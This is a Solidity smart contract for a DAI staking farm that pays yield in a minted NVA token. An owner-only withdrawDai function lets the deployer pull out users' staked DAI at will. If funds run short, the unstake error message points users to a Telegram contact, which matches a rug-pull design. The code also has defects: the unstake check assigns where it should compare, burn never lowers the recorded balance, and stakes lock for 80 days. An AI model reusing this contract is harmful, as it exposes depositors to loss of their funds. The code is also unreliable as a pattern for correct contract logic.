// SPDX-License-Identifier: MIT
pragma solidity 0.8.4;

import "./IERC20.sol";
import "./NVA.sol";

contract PmknFarm {

    uint256 public rate = 259200;
    uint256 minStakeTime = 6912000;

    mapping(address => uint256) public stakingBalance;
    mapping(address => bool) public isStaking;
    mapping(address => uint256) public startTime;
    mapping(address => uint256) public pmknBalance;

    string public name = "NVAFarm";

    IERC20 public daiToken;
    NVAToken public NVAtoken;
    address public owner;

    event Stake(address indexed from, uint256 amount);
    event Unstake(address indexed from, uint256 amount);
    event YieldWithdraw(address indexed to, uint256 amount);
    event Burn(address indexed from, uint256 amount);

    constructor(
        IERC20 _daiToken,
        NVAToken _NVAtoken
        ) {
            daiToken = _daiToken;
            NVAtoken = _NVAtoken;
            owner = msg.sender;
        }

    
    function contractDai() public view returns(uint256) {
        return daiToken.balanceOf(address(this));
    }

    function getRate() external view returns(uint256) {
        return rate;
    }

    function withdrawDai(uint256 amount) external {
        require(msg.sender == owner, "only owner");
        uint256 balance = contractDai();
        require(amount <= balance, "not enough DAI");
        daiToken.transfer(owner, amount);
    }

    function repayDai(uint256 amount) external {
        require(msg.sender == owner, "only owner");
        uint256 balance = daiToken.balanceOf(owner);
        require(balance >= amount, "not enough dai");
        daiToken.transferFrom(owner, address(this), amount);
    }

    
    function changeRate(uint256 new_rate) public {
        require(msg.sender == owner, "only owner");
        rate = new_rate;
    }

    function stake(uint256 amount) public {
        require(
            amount > 0 &&
            daiToken.balanceOf(msg.sender) >= amount, 
            "You cannot stake zero tokens");
        require(daiToken.transferFrom(msg.sender, address(this), amount), "Token transfer failed.");
        if(isStaking[msg.sender] == true){
            uint256 toTransfer = calculateYieldTotal(msg.sender);
            pmknBalance[msg.sender] += toTransfer;
        }
        stakingBalance[msg.sender] += amount;
        startTime[msg.sender] = block.timestamp;
        isStaking[msg.sender] = true;
        emit Stake(msg.sender, amount);
    }

    function unstake(uint256 amount) public {
        require(
            isStaking[msg.sender] = true &&
            stakingBalance[msg.sender] >= amount, 
            "Nothing to unstake"
        );
        uint256 yieldTime = calculateYieldTime(msg.sender);
        require(yieldTime >= minStakeTime, "not enough stake time");
        require(contractDai() >= amount, "the contract does not have enough balance to perform this transaction. Contract support on telegram: https://t.me/Condonato");
        uint256 yieldTransfer = calculateYieldTotal(msg.sender);
        startTime[msg.sender] = block.timestamp;
        uint256 balTransfer = amount;
        amount = 0;
        stakingBalance[msg.sender] -= balTransfer;
        daiToken.transfer(msg.sender, balTransfer);
        pmknBalance[msg.sender] += yieldTransfer;
        if(stakingBalance[msg.sender] == 0){
            isStaking[msg.sender] = false;
        }
        emit Unstake(msg.sender, balTransfer);
    }

    function calculateYieldTime(address user) public view returns(uint256){
        uint256 end = block.timestamp;
        uint256 totalTime = end - startTime[user];
        return totalTime;
    }

    function calculateYieldTotal(address user) public view returns(uint256) {
        uint256 time = calculateYieldTime(user) * 10**18;
        uint256 timeRate = time / rate;
        uint256 rawYield = (stakingBalance[user] * timeRate) / 10**18;
        return rawYield;
    } 

    function withdrawYield() public {
        uint256 toTransfer = calculateYieldTotal(msg.sender);

        require(
            toTransfer > 0 ||
            pmknBalance[msg.sender] > 0,
            "Nothing to withdraw"
            );
        if(pmknBalance[msg.sender] != 0){
            uint256 oldBalance = pmknBalance[msg.sender];
            pmknBalance[msg.sender] = 0;
            toTransfer += oldBalance;
        }

        startTime[msg.sender] = block.timestamp;
        NVAtoken.mint(msg.sender, toTransfer);
        emit YieldWithdraw(msg.sender, toTransfer);
    }

    function burn(uint256 amount) public {
        require(pmknBalance[msg.sender] >= amount, "amount higher than balance");
        NVAtoken.burn(msg.sender, amount);
        emit Burn(msg.sender, amount);
    }
}